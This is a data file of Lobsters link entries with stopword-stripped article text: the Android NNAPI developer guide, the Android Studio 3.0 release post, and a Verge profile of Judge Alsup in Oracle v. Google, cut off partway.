219,Lobsters,android,Android,Neural Networks API in Android 8.1,https://developer.android.com/ndk/guides/neuralnetworks/index.html,neural network api android,tensorflow lite note latency availability speed privacy cost system utilization application size android neural network api sample understand neural network api runtime neural network api programming model model convolution sigmoid rectified linear compilation memory execution provide access training data use native hardware buffer native hardware buffer reference documentation device assignment note model operand quantized operand operation nnapi api reference aneuralnetworkspad tensorflow lite build model figure provide access training data operation type control flow compilation device assignment device discovery assignment model partitioning execution synchronous execution note burst execution dynamically sized output cleanup error management cpu fallback measure performance execution time profile application android systrace systrace generate profiling analysys data tflite image classification example add statistic application code systraceparser output java native application kotlin java operand quantized tensor optional operand tensor unknown rank aneuralnetworksoperandtype nnapi benchmark nnapi log logcat,android neural network api nnapi android c api designed running computationally intensive operation machine learning android device nnapi designed provide base layer functionality higherlevel machine learning framework tensorflow lite build train neural network api available android device running android api level higher note topic us term device refer cpu gpus accelerator topic site device refers android device clarify distinction referring android device topic includes word android instance word device refer processor accelerator nnapi support inferencing applying data android device previously trained developerdefined model example inferencing include classifying image predicting user behavior selecting appropriate response search query ondevice inferencing many benefit latency need send request network connection wait response example critical video application process successive frame coming camera availability application run even outside network coverage speed new hardware specific neural network processing provides significantly faster computation generalpurpose cpu alone privacy data leave android device cost server farm needed computation performed android device also tradeoff developer keep mind system utilization evaluating neural network involves lot computation could increase battery power usage consider monitoring battery health concern app especially longrunning computation application size pay attention size model model may take multiple megabyte space bundling large model apk would unduly impact user may want consider downloading model app installation using smaller model running computation cloud nnapi provide functionality running model cloud see android neural network api sample see one example use nnapi understand neural network api runtime nnapi meant called machine learning library framework tool let developer train model offdevice deploy android device apps typically would use nnapi directly would instead use higherlevel machine learning framework framework turn could use nnapi perform hardwareaccelerated inference operation supported device based app requirement hardware capability android device android neural network runtime efficiently distribute computation workload across available ondevice processor including dedicated neural network hardware graphic processing unit gpus digital signal processor dsps android device lack specialized vendor driver nnapi runtime executes request cpu figure show highlevel system architecture nnapi figure system architecture android neural network api neural network api programming model perform computation using nnapi first need construct directed graph defines computation perform computation graph combined input data example weight bias passed machine learning framework form model nnapi runtime evaluation nnapi us four main abstraction model computation graph mathematical operation constant value learned training process operation specific neural network include convolution logistic sigmoid activation rectified linear relu activation creating model synchronous operation successfully created reused across thread compilation nnapi model represented aneuralnetworksmodel instance compilation represents configuration compiling nnapi model lowerlevel code creating compilation synchronous operation successfully created reused across thread execution nnapi compilation represented aneuralnetworkscompilation instance memory represents shared memory memory mapped file similar memory buffer using memory buffer let nnapi runtime transfer data driver efficiently app typically creates one shared memory buffer contains every tensor needed define model also use memory buffer store input output execution instance nnapi memory buffer represented aneuralnetworksmemory instance execution interface applying nnapi model set input gather result execution performed synchronously asynchronously asynchronous execution multiple thread wait execution execution completes thread released nnapi execution represented aneuralnetworksexecution instance figure show basic programming flow figure programming flow android neural network api rest section describes step set nnapi model perform computation compile model execute compiled model tip brevity omitted checking result code operation code snippet make sure production code provide access training data trained weight bias data likely stored file provide nnapi runtime efficient access data create aneuralnetworksmemory instance calling aneuralnetworksmemorycreatefromfd function passing file descriptor opened data file also specify memory protection flag offset shared memory region start file create memory buffer file contains trained data aneuralnetworksmemory null int fd open trainingdata ordonly aneuralnetworksmemorycreatefromfd filesize protread fd although example use one aneuralnetworksmemory instance weight possible use one aneuralnetworksmemory instance multiple file use native hardware buffer use native hardware buffer model input output constant operand value certain case nnapi accelerator access ahardwarebuffer object without driver needing copy data ahardwarebuffer many different configuration every nnapi accelerator may support configuration limitation refer constraint listed aneuralnetworksmemorycreatefromahardwarebuffer reference documentation test ahead time target device ensure compilation execution use ahardwarebuffer behave expected using device assignment specify accelerator allow nnapi runtime access ahardwarebuffer object create aneuralnetworksmemory instance calling aneuralnetworksmemorycreatefromahardwarebuffer function passing ahardwarebuffer object shown following code sample configure create ahardwarebuffer object ahardwarebufferdesc desc ahardwarebuffer awhb nullptr ahardwarebufferallocate desc awhb create aneuralnetworksmemory ahardwarebuffer aneuralnetworksmemory null aneuralnetworksmemorycreatefromahardwarebuffer ahwb nnapi longer need access ahardwarebuffer object free corresponding aneuralnetworksmemory instance aneuralnetworksmemoryfree note use ahardwarebuffer whole buffer use arect parameterthe nnapi runtime flush buffer need make sure input output buffer accessible scheduling executionthere support sync fence file descriptorsfor ahardwarebuffer vendorspecific format usage bit vendor implementation determine whether client driver responsible flushing cache model model fundamental unit computation nnapi model defined one operand operation operand operand data object used defining graph include input output model intermediate node contain data flow one operation another constant passed operation two type operand added nnapi model scalar tensor scalar represents single value nnapi support scalar value boolean floating point floating point integer unsigned integer format operation nnapi involve tensor tensor ndimensional array nnapi support tensor floating point floating point quantized quantized integer boolean value example figure represents model two operation addition followed multiplication model take input tensor produce one output tensor figure example operand nnapi model model seven operand operand identified implicitly index order added model first operand added index second index operand constant operand order add operand matter example model output operand could first one added important part use correct index value referring operand operand type specified added model operand used input output model every operand must either model input constant output operand exactly one operation additional information using operand see operand operation operation specifies computation performed operation consists element operation type example addition multiplication convolution list index operand operation us input list index operand operation us output order list matter see nnapi api reference expected input output operation type must add operand operation consumes produce model adding operation order add operation matter nnapi relies dependency established computation graph operand operation determine order operation executed operation nnapi support summarized table known issue api level passing tensor aneuralnetworkspad operation available android api level higher output nnapi may match output higherlevel machine learning framework tensorflow lite instead pas issue resolved android api level higher build model following example create twooperation model found figure build model follow step call aneuralnetworksmodelcreate function define empty model aneuralnetworksmodel model null aneuralnetworksmodelcreate model add operand model calling aneuralnetworksaddoperand data type defined using aneuralnetworksoperandtype data structure example tensor matrix dimension aneuralnetworksoperandtype field used quantized tensor field used quantized tensor dims dims also specify operand activation function specifier aneuralnetworksoperandtype activationtype activationtypetype activationtypescale activationtypezeropoint activationtypedimensioncount activationtypedimensions null add seven operand order defined diagram aneuralnetworksmodeladdoperand model operand aneuralnetworksmodeladdoperand model operand aneuralnetworksmodeladdoperand model activationtype operand aneuralnetworksmodeladdoperand model operand aneuralnetworksmodeladdoperand model operand aneuralnetworksmodeladdoperand model activationtype operand aneuralnetworksmodeladdoperand model operand operand constant value weight bias app obtains training process use aneuralnetworksmodelsetoperandvalue aneuralnetworksmodelsetoperandvaluefrommemory function following example set constant value training data file corresponding memory buffer created provide access training data example operand constant tensor whose value established training process const int sizeoftensor formula size calculation elementsize aneuralnetworksmodelsetoperandvaluefrommemory model sizeoftensor aneuralnetworksmodelsetoperandvaluefrommemory model sizeoftensor sizeoftensor set value activation operand example operand nonevalue aneuralnetworksfusednone aneuralnetworksmodelsetoperandvalue model nonevalue sizeof nonevalue aneuralnetworksmodelsetoperandvalue model nonevalue sizeof nonevalue operation directed graph want compute add operation model calling aneuralnetworksmodeladdoperation function parameter call app must provide operation type count input value array index input operand count output value array index output operand note operand used input output operation two operation example first consumes operand produce operand addinputindexes addoutputindexes aneuralnetworksmodeladdoperation model aneuralnetworksadd addinputindexes addoutputindexes second consumes operand produce operand multinputindexes multoutputindexes aneuralnetworksmodeladdoperation model aneuralnetworksmul multinputindexes multoutputindexes identify operand model treat input output calling aneuralnetworksmodelidentifyinputsandoutputs function model one input one output modelinputindexes modeloutputindexes aneuralnetworksmodelidentifyinputsandoutputs model modelinputindexes modeloutputindexes optionally specify whether allowed calculated range precision low ieee floatingpoint format calling call aneuralnetworksmodelfinish finalize definition model error function return result code aneuralnetworksnoerror aneuralnetworksmodelfinish model create model compile number time execute compilation number time control flow incorporate control flow nnapi model following construct corresponding execution subgraphs else subgraphs statement condition body subgraphs loop standalone aneuralnetworksmodel model aneuralnetworksmodel thenmodel makethenmodel aneuralnetworksmodel elsemodel makeelsemodel create operand reference model within model containing control flow aneuralnetworksoperandtype modeltype type aneuralnetworksmodel aneuralnetworksmodeladdoperand model modeltype kthenoperandindex aneuralnetworksmodeladdoperand model modeltype kelseoperandindex aneuralnetworksmodelsetoperandvaluefrommodel model kthenoperandindex thenmodel aneuralnetworksmodelsetoperandvaluefrommodel model kelseoperandindex elsemodel add control flow operation input kconditionoperandindex kthenoperandindex kelseoperandindex output aneuralnetworksmodeladdoperation model aneuralnetworksif std size input input std size output output compilation compilation step determines processor model executed asks corresponding driver prepare execution could include generation machine code specific processor model run compile model follow step call aneuralnetworkscompilationcreate function create new compilation instance compile model aneuralnetworkscompilation compilation aneuralnetworkscompilationcreate model compilation optionally use device assignment explicitly choose device execute optionally influence runtime trade battery power usage execution speed calling aneuralnetworkscompilationsetpreference ask optimize low power consumption aneuralnetworkscompilationsetpreference compilation aneuralnetworkspreferlowpower preference specify include optionally set compilation caching calling aneuralnetworkscompilationsetcaching set compilation caching aneuralnetworkscompilationsetcaching compilation cachedir token use getcodecachedir cachedir token specified must unique model within application finalize compilation definition calling aneuralnetworkscompilationfinish error function return result code aneuralnetworksnoerror aneuralnetworkscompilationfinish compilation device discovery assignment android device running android api level higher nnapi provides function allow machine learning framework library apps get information device available specify device used execution providing information available device allows apps get exact version driver found device avoid known incompatibility giving apps ability specify device execute different section model apps optimized android device deployed device discovery use aneuralnetworksgetdevicecount get number available device device use aneuralnetworksgetdevice set aneuralnetworksdevice instance reference device device reference find additional information device using following function device assignment use aneuralnetworksmodelgetsupportedoperationsfordevices discover operation model run specific device control accelerator use execution call aneuralnetworkscompilationcreatefordevices place aneuralnetworkscompilationcreate use resulting aneuralnetworkscompilation object normal function return error provided model contains operation supported selected device multiple device specified runtime responsible distributing work across device similar device nnapi cpu implementation represented aneuralnetworksdevice name nnapireference type aneuralnetworksdevicetypecpu calling aneuralnetworkscompilationcreatefordevices cpu implementation used handle failure case model compilation execution application responsibility partition model submodels run specified device application nt need manual partitioning continue call simpler aneuralnetworkscompilationcreate use available device including cpu accelerate model model could nt fully supported device specified using aneuralnetworkscompilationcreatefordevices aneuralnetworksbaddata returned model partitioning multiple device available model nnapi runtime distributes work across device example one device provided aneuralnetworkscompilationcreatefordevices specified one considered allocating work note cpu device list cpu execution disabled using aneuralnetworkscompilationcreate available device taken account including cpu distribution done selecting list available device operation model device supporting operation declaring best performance ie fastest execution time lowest power consumption depending execution preference specified client partitioning algorithm nt account possible inefficiency caused io different processor specifying multiple processor either explicitly using aneuralnetworkscompilationcreatefordevices implicitly using aneuralnetworkscompilationcreate important profile resulting application understand model partitioned nnapi check android log message info level tag executionplan modelbuilder findbestdeviceforeachoperation opname deviceindex opname descriptive name operation graph deviceindex index candidate device list device list input provided aneuralnetworkscompilationcreatefordevices using aneuralnetworkscompilationcreatefordevices list device returned iterating device using aneuralnetworksgetdevicecount aneuralnetworksgetdevice message info level tag executionplan modelbuilder partitionthework one best device devicename message indicates whole graph accelerated device devicename execution execution step applies model set input store computation output one user buffer memory space app allocated execute compiled model follow step call aneuralnetworksexecutioncreate function create new execution instance run compiled model set input aneuralnetworksexecution null aneuralnetworksexecutioncreate compilation specify app read input value computation app read input value either user buffer allocated memory space calling aneuralnetworksexecutionsetinput aneuralnetworksexecutionsetinputfrommemory respectively set single input sample model since small wo nt use memory buffer myinput data aneuralnetworksexecutionsetinput null myinput sizeof myinput important index specify setting execution input output index list input output model specified aneuralnetworksmodelidentifyinputsandoutputs nt confuse operand index used creating model example model three input see three call aneuralnetworksexecutionsetinput one index one index one index specify app writes output value app write output value either user buffer allocated memory space calling aneuralnetworksexecutionsetoutput aneuralnetworksexecutionsetoutputfrommemory respectively set output myoutput aneuralnetworksexecutionsetoutput null myoutput sizeof myoutput schedule execution start calling aneuralnetworksexecutionstartcompute function error function return result code aneuralnetworksnoerror start work work proceeds asynchronously aneuralnetworksevent null aneuralnetworksexecutionstartcompute call aneuralnetworkseventwait function wait execution complete execution successful function return result code aneuralnetworksnoerror waiting done different thread one starting execution example work wait completion aneuralnetworkseventwait aneuralnetworkseventfree aneuralnetworksexecutionfree optionally apply different set input compiled model using compilation instance create new aneuralnetworksexecution instance apply compiled model different set input aneuralnetworksexecution aneuralnetworksexecutioncreate compilation aneuralnetworksexecutionsetinput aneuralnetworksexecutionsetoutput aneuralnetworksevent null aneuralnetworksexecutionstartcompute aneuralnetworkseventwait aneuralnetworkseventfree aneuralnetworksexecutionfree synchronous execution asynchronous execution spends time spawn synchronize thread furthermore latency hugely variable longest delay reaching microsecond time thread notified woken time eventually bound cpu core improve latency instead direct application make synchronous inference call runtime call return inference completed rather returning inference started instead calling aneuralnetworksexecutionstartcompute asynchronous inference call runtime application call aneuralnetworksexecutioncompute make synchronous call runtime call aneuralnetworksexecutioncompute take aneuralnetworksevent paired call aneuralnetworkseventwait note estimate impact using aneuralnetworksexecutioncompute without modifying application set debugnnsyncexecruntime property cause aneuralnetworksexecutionstartcompute function synchronously burst execution android device running android api level higher nnapi support burst execution aneuralnetworksburst object burst execution sequence execution compilation occur rapid succession operating frame camera capture successive audio sample using aneuralnetworksburst object may result faster execution indicate accelerator resource may reused execution accelerator remain highperformance state duration burst aneuralnetworksburst introduces small change normal execution path create burst object using aneuralnetworksburstcreate shown following code snippet create burst object reused across sequence execution aneuralnetworksburst burst null aneuralnetworksburstcreate compilation burst burst execution synchronous however instead using aneuralnetworksexecutioncompute perform inference pair various aneuralnetworksexecution object aneuralnetworksburst call function aneuralnetworksexecutionburstcompute create configure first execution object execute using burst object aneuralnetworksexecutionburstcompute burst use result first execution free execution object create configure second execution object execute using burst object aneuralnetworksexecutionburstcompute burst use result second execution free execution object free aneuralnetworksburst object aneuralnetworksburstfree longer needed cleanup aneuralnetworksburstfree burst dynamically sized output support model size output depends input size determined model execution aneuralnetworksexecutiongetoutputoperandrank aneuralnetworksexecutiongetoutputoperanddimensions following code sample show get rank output myoutputrank aneuralnetworksexecutiongetoutputoperandrank myoutputrank get dimension output std vector myoutputdimensions myoutputrank aneuralnetworksexecutiongetoutputoperanddimensions myoutputdimensionsdata cleanup cleanup step handle freeing internal resource used computation cleanup aneuralnetworkscompilationfree compilation aneuralnetworksmodelfree model aneuralnetworksmemoryfree error management cpu fallback error partitioning driver fails compile piece model driver fails execute compiled piece model nnapi might fall back cpu implementation one operation nnapi client contains optimized version operation example tflite might advantageous disable cpu fallback handle failure client optimized operation implementation android compilation performed using aneuralnetworkscompilationcreatefordevices cpu fallback disabled android p nnapi execution fall back cpu execution driver fails also true android aneuralnetworkscompilationcreate rather aneuralnetworkscompilationcreatefordevices used first execution fall back single partition still fails retries entire model cpu partitioning compilation fails entire model tried cpu case operation supported cpu situation compilation execution fail rather falling back even disabling cpu fallback may still operation model scheduled cpu cpu list processor supplied aneuralnetworkscompilationcreatefordevices either processor support operation processor claim best performance operation chosen primary nonfallback executor ensure cpu execution use aneuralnetworkscompilationcreatefordevices excluding nnapireference list device starting android p possible disable fallback execution time debug build setting debugnnpartition property measure performance evaluate app performance measuring execution time profiling execution time want determine total execution time runtime use synchronous execution api measure time taken call want determine total execution time lower level software stack use aneuralnetworksexecutionsetmeasuretiming aneuralnetworksexecutiongetduration get execution time accelerator driver run host processor execution time driver including time accelerator execution time driver excludes overhead runtime ipc needed runtime communicate driver apis measure duration work submitted work completed event rather time driver accelerator devotes performing inference possibly interrupted context switching example inference begin driver stop work perform inference resume completes inference execution time inference include time work stopped perform inference timing information may useful production deployment application collect telemetry offline use use timing data modify app higher performance using functionality bear mind following collecting timing information might performance cost driver capable computing time spent accelerator excluding time spent nnapi runtime ipc use apis aneuralnetworksexecution created aneuralnetworkscompilationcreatefordevices numdevices driver required able report timing information profile application android systrace starting android nnapi automatically generates systrace event use profile application nnapi source come parsesystrace utility process systrace event generated application generate table view showing time spent different phase model lifecycle instantiation preparation compilation execution termination different layer application layer application split application main application code runtime nnapi runtime ipc inter process communication nnapi runtime driver code driver accelerator driver process generate profiling analysys data assuming checked aosp source tree androidbuildtop using tflite image classification example target application generate nnapi profiling data following step start android systrace following command androidbuildtopexternalchromiumtracesystracepy tracehtml orgtensorflowliteexamplesclassification nnapi hal freq sched idle load binderdriver tracehtml parameter indicates trace written tracehtml profiling application need replace orgtensorflowliteexamplesclassification process name specified app manifest keep one shell console busy nt run command background since interactively waiting enter terminate systrace collector started start app run benchmark test case start image classification app android studio directly test phone ui app already installed generate nnapi data need configure app use nnapi selecting nnapi target device app configuration dialog test completes terminate systrace pressing enter console terminal active since step run systraceparser utility generate cumulative statistic androidbuildtopframeworksmlnntoolssystraceparserparsesystracepy totaltimes tracehtml parser accepts following parameter totaltimes show total time spent layer including time spent waiting execution call underlying layer printdetail print event collected systrace perexecution print execution subphases perexecution time instead stats phase json produce output json format example output shown nnapi timing summary total time m wallclock execution initialization preparation compilation io compute result ex total termination total application na na na na runtime ipc driver na na na total total ignores missing na value thus necessarily consistent rest number parser might fail collected event represent complete application trace particular might fail systrace event generated mark end section present trace without associated section start event usually happens event previous profiling session generated start systrace collector case would run profiling add statistic application code systraceparser output parsesystrace application based builtin android systrace functionality add trace specific operation app using systrace api java native application custom event name associate custom event phase application lifecycle prepend event name one following string nnlapi application level event initialization nnlapp application level event preparation nnlapc application level event compilation nnlape application level event execution example alter tflite image classification example code adding runinferencemodel section execution phase application layer containing another section preprocessbitmap wo nt considered nnapi trace runinferencemodel section part systrace event processed nnapi systrace parser kotlin run inference return classification result fun recognizeimage bitmap bitmap list section appear nnapi systrace analysis tracebeginsection preprocessbitmap convertbitmaptobytebuffer bitmap traceendsection run inference call add method nnapi systrace analysis tracebeginsection nnlape runinferencemodel long starttime systemclockuptimemillis runinference long endtime systemclockuptimemillis traceendsection return recognition java run inference return classification result public list recognizeimage final bitmap bitmap section appear nnapi systrace analysis tracebeginsection preprocessbitmap convertbitmaptobytebuffer bitmap traceendsection run inference call add method nnapi systrace analysis tracebeginsection nnlape runinferencemodel long starttime systemclockuptimemillis runinference long endtime systemclockuptimemillis traceendsection traceendsection return recognition operand following section cover advanced topic using operand quantized tensor quantized tensor compact way represent ndimensional array floating point value nnapi support asymmetric quantized tensor tensor value cell represented integer associated tensor scale zero point value used convert integer floating point value represented formula cellvalue zeropoint scale zeropoint value integer scale floating point value compared tensor floating point value quantized tensor two advantage application smaller trained weight take quarter size tensor computation often executed faster due smaller amount data need fetched memory efficiency processor dsps integer math possible convert floating point model quantized one experience shown better result achieved training quantized model directly effect neural network learns compensate increased granularity value quantized tensor scale zeropoint value determined training process nnapi define quantized tensor type setting type field aneuralnetworksoperandtype data structure also specify scale zeropoint value tensor data structure addition asymmetric quantized tensor nnapi support following optional operand operation like aneuralnetworkslshprojection take optional operand indicate model optional operand omitted call aneuralnetworksmodelsetoperandvalue function passing null buffer length decision whether operand present varies execution indicate operand omitted using aneuralnetworksexecutionsetinput aneuralnetworksexecutionsetoutput function passing null buffer length tensor unknown rank android api level introduced model operand unknown dimension known rank number dimension android api level introduced tensor unknown rank shown aneuralnetworksoperandtype nnapi benchmark nnapi benchmark available aosp platformtestmltsbenchmark benchmark app platformtestmltsmodels model datasets benchmark evaluates latency accuracy compare driver work done using tensorflow lite running cpu model datasets use benchmark following connect target android device computer open terminal window make sure device reachable adb one android device connected export target device androidserial environment variable navigate android toplevel source directory run following command lunch aosparmuserdebug available testmltsbenchmarkbuildandrunbenchmarksh end benchmark run result presented html page passed xdgopen nnapi log nnapi generates useful diagnostic information system log analyze log use logcat utility enable verbose nnapi logging specific phase component setting property debugnnvlog using adb shell following list value separated space colon comma model model building compilation generation model execution plan compilation execution model execution cpuexe execution operation using nnapi cpu implementation manager nnapi extension available interface capability related info element example enable full verbose logging use command adb shell setprop debugnnvlog disable verbose logging use command adb shell setprop debugnnvlog enabled verbose logging generates log entry info level tag set phase component name beside debugnnvlog controlled message nnapi api component provide log entry various level one using specific log tag get list component search source tree using following expression grep r define logtag awk f print sort u egrep v samplefiletagtest expression currently return following tag burstbuilder callback compilationbuilder cpuexecutor executionbuilder executionburstcontroller executionburstserver executionplan fibonaccidriver graphdump indexedshapewrapper ionwatcher manager memory memoryutils metamodel modelargumentinfo modelbuilder neuralnetworks operationresolver operation operationsutils packageinfo tokenhasher typemanager utils validatehal versionedinterfaces control level log message shown logcat use environment variable androidlogtags show full set nnapi log message disable others set androidlogtags following burstbuilder v callback v compilationbuilder v cpuexecutor v executionbuilder v executionburstcontroller v executionburstserver v executionplan v fibonaccidriver v graphdump v indexedshapewrapper v ionwatcher v manager v memoryutils v memory v metamodel v modelargumentinfo v modelbuilder v neuralnetworks v operationresolver v operationsutils v operation v packageinfo v tokenhasher v typemanager v utils v validatehal v versionedinterfaces v set androidlogtags using following command export androidlogtags grep r define logtag awk f print v sort u egrep v samplefiletagtest xargs echo n echo note filter applies logcat still need set property debugnnvlog generate verbose log info
220,Lobsters,android,Android,Android Studio 3.0,https://android-developers.googleblog.com/2017/10/android-studio-30.html,android studio,jamal eason develop kotlin programming language announced google io kotlin code convert java file kotlin file support android studio java language feature migration javac learn layout editor learn adaptive icon wizard learn xml font downloadable font android thing support learn intellij platform update learn build build speed improvement learn google maven repository sdk manager tool gradle learn test debug google play system image learn opengl e support android emulator learn app bug reporter android emulator learn proxy support android lean android emulator quick boot canary learn apk debugging profile debug apk file profile debug apk learn layout inspector learn device file explorer learn android test orchestrator support instrumentation learn android profiler android profiler learn apk analyzer improvement learn develop build optimize release note getting started download download page file issue google twitter,posted jamal eason product manager android android studio ready download today announced google io android studio large update focused accelerating app development android release android studio packed many new update three major feature area want miss including new suite app profiling tool quickly diagnose performance issue support kotlin programming language new set tool wizard accelerate development latest android oreo apis also invested time improving stability performance across many area android studio thanks feedback preview version android studio looking high stability want build high quality apps android oreo develop kotlin language use latest android app performance tool download android studio today check list new feature android studio organized key developer flow video new android studio develop kotlin programming language announced google io kotlin programming language officially supported android development kotlin expressive concise language interoperable existing android language runtimes mean use little much language app want kotlin productionready language used many popular android apps google play today release android studio first milestone bundle kotlin language support inside ide many favorite feature code completion syntax highlighting work well release continue improve remaining editor feature upcoming release choose add kotlin project using builtin conversion tool found code convert java file kotlin file create kotlin enabled project new project wizard lean kotlin language support android studio kotlin language conversion android studio java language feature android studio continuing improve support java language feature migration javac based toolchain using java language feature project even easier update project support new java language toolchain simply update source target compatibility level project structure dialog learn layout editor component tree layout editor better draganddrop view insertion new error panel learn adaptive icon wizard new wizard creates set launcher icon asset provides preview adaptive icon look different launcher screen icon mask support vectordrawable layer new release learn xml font downloadable font target android oreo api level higher android app add custom font downloadable font using xml android studio android thing support android studio includes new set template new project wizard new module wizard develop android thing platform learn intellij platform update android studio includes intellij release feature java language refactoring parameter hint semantic highlighting draggable breakpoints enhanced version control search learn build build speed improvement improve speed gradle larger scale project many module introduced rare breaking api change android gradle plugin improve scalability build time change one reason jumped version number android studio depend apis provided previous gradle plugin validate compatibility new plugin migrate new apis test update plugin version buildgradle file learn google maven repository facilitate smaller faster update android studio utilizes google maven repository default instead using android sdk manager find update android support library google play service firebase maven dependency used combination latest command line sdk manager tool gradle continuous integration build migrate google maven repository future maven repository update learn test debug google play system image also updated emulator system image android oreo include google play store bundling google play store allows endtoend testing apps google play provides convenient way keep google play service uptodate android virtual device avd google play service update physical device trigger update avds google play store android emulator ensure app security consistent experience physical device emulator system image google play store included signed release key mean able get elevated privilege require elevated privilege root aid app troubleshooting use android open source project aosp emulator system image include google apps service learn opengl e support android emulator latest version android emulator opengl e support android oreo system image along significant improvement opengl e graphic performance older emulator system image learn app bug reporter android emulator help documenting bug app added easier way generate bug report android emulator necessary configuration setting space capture repro step learn proxy support android use proxy access internet added user interface manage http proxy setting used emulator lean android emulator quick boot canary one common pain point hear emulator take long boot address concern excited preview new feature solve called quick boot significantly speed emulator start time enabled first time start avd cold boot occur like powering device subsequent start fast system restored state closed emulator similar waking device want try ensure canary update release channel find android emulator sdk manager learn apk debugging android studio allows debug arbitrary apk functionally especially helpful develop android c code another ide want debug analyze apk context android studio long debuggable version apk use new apk debugging feature analyze profile debug apk moreover access source apk link source apk debugging flow higher fidelity debugging process get started simply selecting profile debug apk android studio welcome screen file profile debug apk learn apk debugging layout inspector release added additional enhancement layout inspector including better grouping property common category well search functionality view tree property panel learn device file explorer new device file explorer android studio allows view file directory structure android device emulator testing app quickly preview modify app data file directly android studio learn android test orchestrator support used androidjunitrunner higher android gradle plugin support use android test orchestrator android test orchestrator allows app test run within instrumentation learn optimize android profiler android studio includes brand new suite tool help debug performance problem app completely rewrote previous set android monitor tool replaced android profiler deploy app running device emulator click android profiler tab access realtime unified view cpu memory network activity app performance event mapped ui event timeline highlight touch event key press activity change context certain event happened click timeline dig performance aspect app learn android profiler combined timeline view cpu profiler memory profiler network profiler apk analyzer improvement also updated apk analyzer additional enhancement help optimize size apk learn recap android studio includes new major feature develop build optimize check release note detail getting started download using previous version android studio upgrade android studio today download update official android studio preview download page mentioned blog breaking gradle plugin api change support new feature ide therefore also update android gradle plugin version current project test validate app project setup appreciate feedback thing like issue feature would like see find bug issue feel free file issue connect u android studio development team google page twitter
221,Lobsters,android,Android,How the judge on Oracle v. Google taught himself to code,https://www.theverge.com/2017/10/19/16503076/oracle-vs-google-judge-william-alsup-interview-waymo-uber,judge oracle v google taught code,master court java mastermind rubberstamping obvious technology befuddled basic process coding online shopping cart billion mega corporation federal circuit supreme court say like section b joshua bloch countless law review article irate azimuthal projection map host recursive acronym search engine bing court order called press,may attorney oracle google battling nine line code hearing judge william h alsup northern district california first jury trial oracle v google fight whether google hijacked code oracle android system wrapping argument centered function called rangecheck line code oracle tested million total one literally copied every keystroke perfect duplicate oracle interest play significance rangecheck much possible david boy oracle lawyer began argue google copied rangecheck could take android market quickly judge alsup buying could nt told first thing java trial said judge done still lot programming language written block code like rangecheck hundred time could could simple counsel oracle tried continue speaking judge became indignant offhand comment would snowball control much alsup chagrin first repeated among lawyer legal wonk tech publication every repetition alsup skill grew eventually became judge learned java alsup programmer blackrobed nerd hero judge master court java judge alsup would like everyone know know java well anyway however definitely code coding basic decade actually writing program fun program play bridge written gift wife automatic solution board game mastermind immensely fond ambitiously sprawling multifunctional program graphical interface help yet another many hobby ham radio major case wound docket maybe one judge america capable understanding technical detail judge code interest served well judicial bench informing outlook multibilliondollar intellectual property case come fortune tech company rise fall depending ruling oracle v google wide repercussion big company smaller developer alike say nothing billion stake yettobetotaled billion alphabet seeking uber ongoing waymo v uber suit could make break uber player nascent selfdriving car market sheer coincidence major case wound docket maybe one judge america capable understanding technical detail judge code alsup longcherished hobby illuminated issue heart oracle v google offhours tinkering photography lens science light inform waymo v uber case involving lidar laserbased technology selfdriving car navigation tech industry long despaired law inability comprehend making much legal system struggle keep rapid pace progress belief law never catch technology borne part tech exceptionalism libertarian elitism derides kind legal regulatory impediment luddism also fueled genuine frustration state law patent office perceived rubberstamping obvious technology supreme court justice appear befuddled basic process coding attorney stack jury nontechnical juror return massive verdict patent online shopping cart landscape alsup outlier mystifying exception accepted wisdom law make sense fastchanging tech industry alsup secret simple lifelong geek alsup notorious among san francisco attorney early hour keep force upon lawyer appear judge chamber federal courthouse still dark door closed got alsup chamber door flung open bustle inside suggested everyone already work hour whitehaired man rectangular wireframe glass soft southern accent alsup normal stature imposing presence leaf impression tower alsup chamber many classic aesthetic legal profession shelf upon shelf leatherbound book stained wood paneling small blackandwhite portrait abraham lincoln hanging intimidatingly large desk side sits sofa strewn dog toy alsup jack russell terrier often brings work office day judge sat sofa walked program courtissued dell laptop run program desktop computer said irritation dell stay last one support quickbasic kind shame language really know last one support quickbasic kind shame language really know judge hardware fanatic us computer whatever smartphone court provided courtissued iphone northern district california issued android use android said asked could put code github asked github lieu handed printout computer program three stack paper neatly stapled corner one top apologized several dependency time print long became judge presiding silicon valley alsup hobbyist operating isolation geek geek another era alsup born jackson mississippi son two rural texan nurse civil engineer got start roosevelt work progress administration even boy alsup displayed freewheeling curiosity technical bent would characterize later life spent much childhood alongside hubert feild professor auburn university friend since age six two built fort together buried time capsule launched lighterthanair balloon made laundry bag shot flaming match clothespin alsup invention dirt clod war feild said recommended bill extremely bright kid feild said alsup taught piano dissatisfied sound modified instrument pressing thumb tack hammer strike piano wire hack made piano sound like came longlost cowboy saloon still recording bill playing classic song ray charles new improved version piano feild said one gadget caught boy imagination ham radio two spent hour listening shortwave broadcast combing frequency zenith transoceanic radio sevenfoot telescoping antenna tuned faraway station like radio moscow radio quito radio havana time spent listening amateur radio operator socalled ham listened conversation ham various state u well foreign country new world discovered beyond confines mississippi feild said would listen alsup became licensed ham operator still high school carried conversation bedroom faroff interlocutor sometimes morse code young alsup ham radio around bill continues strong influence life feild said last year bill talk via ham radio saturday morning high school alsup began engineering major mississippi state intending civil engineer like father civil right movement full swing march washington happened freshman year college civil right act passed sophomore year alsup took interest broader legal issue something clicked wanted another atticus finch alsup said college attended harvard law school went clerk supreme court justice william douglas set shop mississippi civil right work found financially unsustainable eventually wife relocated san francisco year worked private practice department justice commissioned federal judge president bill clinton wanted another atticus finch northern district california alsup fearsome reputation among lawyer early hour bane attorney forced argue motion early seven sometimes even earlier judge see everyone present litigator timed minute jury let exact time specifies second oracle v google trial refused allow lawyer continue question eric schmidt past even though meant president alphabet would return court next day business billion mega corporation would make way juror picking kid daycare putting dinner table catching train long commute back home know witness busy man alsup said juror time count lot right keep courtroom significantly colder rest building rumored air conditioning cranked high keep juror awake someone cough gallery alsup pause trial demand know cougher identified judge produce cough drop keep judge bench eventuality cough drop shame passed rank attorney gallery cough persists cougher must exit courtroom swiftly quietly possible someone cough gallery alsup pause trial demand know earshot juror closed inside deliberation room harsh attorney judge juror see grandfatherly solicitous southern gentleman one take time ask individual juror thank time putting one oracle v google juror stung bee trial alsup asked could still follow proceeding hemmed hawed said let rephrase understand going well could stung bee yes replied without hesitation american system allows attorney great deal power get juror jury software copyright trial taking place san francisco california tech capital world ended zero juror experience computer industry attorney pick judge end litigator techdominated northern district california learned pull fast one judge alsup sample code judge alsup opinion oracle v google oracle v google vast sprawling piece litigation android platform one billion dollar stake leastsignificant possible consequence lawsuit reason notable computer programmer signed onto amicus curia brief computer scientist federal circuit later supreme court attempt explain technical 